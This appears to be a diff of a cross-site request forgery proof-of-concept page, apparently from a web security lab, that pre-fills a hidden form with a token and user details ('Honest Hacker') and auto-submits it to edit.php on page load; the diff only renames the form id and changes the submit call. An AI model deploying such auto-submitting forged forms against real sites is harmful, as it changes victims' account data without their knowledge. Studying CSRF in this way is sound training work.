@@ -1,6 +1,7 @@
+<!DOCTYPE html>
 <html>
 <body>
-<form action="edit.php?id=1" method="post" name="malicious">
+<form action="edit.php?id=1" method="post" id="malicious">
     <input type="hidden" name="csrf_token" value="5b355431652392a5f9b9f0db69f64647" />
     <input type="hidden" name="first_name" value="Honest" />
     <input type="hidden" name="last_name" value="Hacker" />
@@ -11,7 +12,7 @@
     <input type="hidden" name="confirm_password" value="" /><br />
   </form>
   <script>
-    document.forms[0].submit();
+         document.getElementById("malicious").submit();
   </script>
 </body>
 </html>
